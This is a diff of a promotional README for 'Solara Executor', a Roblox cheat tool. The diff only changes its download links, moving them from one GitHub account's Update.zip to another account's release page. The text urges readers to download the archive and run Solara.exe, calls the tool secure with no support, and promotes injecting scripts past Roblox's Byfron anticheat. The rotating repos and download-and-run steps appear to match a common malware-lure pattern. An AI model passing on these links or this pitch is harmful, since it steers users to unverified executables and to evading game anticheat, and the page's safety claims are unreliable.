@@ -1,8 +1,8 @@
-# 🚀 Solara Executor - Roblox Executor **[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://github.com/waellaataoui/Solara-Executor/releases/download/Releasev4/Update.zip)**
+# 🚀 Solara Executor - Roblox Executor **[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://github.com/RoblExploits/solara-executor-roblox/releases/tag/solara-executor-roblox)**
 
 ## Quick Installation
 To get started with Solara Executor, follow these simple steps:
-1. **[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://github.com/waellaataoui/Solara-Executor/releases/download/Releasev4/Update.zip)** 
+1. **[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://github.com/RoblExploits/solara-executor-roblox/releases/tag/solara-executor-roblox)** 
 2. **Run Solara:** Run the `Solara.exe` file to launch the executor.
 **Description:**  
 🚀 **Solara Executor** is a cutting-edge Roblox script executor designed for advanced script execution, optimized performance, and seamless user experience. Fully compatible with the latest Roblox updates, it is secure, easy to use, and perfect for gamers, developers, and modding enthusiasts looking to enhance their Roblox gameplay. 
@@ -24,9 +24,9 @@ To get started with Solara Executor, follow these simple steps:
     Wave is a Roblox Executor that injects script that takes advantage of Roblox weak anticheat Byfron.
     <br/>
     <br/>
-    <a href="https://github.com/CheatsHelp/Solara-Executor-Roblox/releases/tag/solara-executor-roblox">Download</a>
+    <a href="https://github.com/RoblExploits/solara-executor-roblox/releases/tag/solara-executor-roblox">Download</a>
     .
-    <a href="https://github.com/CheatsHelp/Solara-Executor-Roblox">Site</a>
+    <a href="https://github.com/RoblExploits/solara-executor-roblox">Site</a>
   </p>
 </p>
 
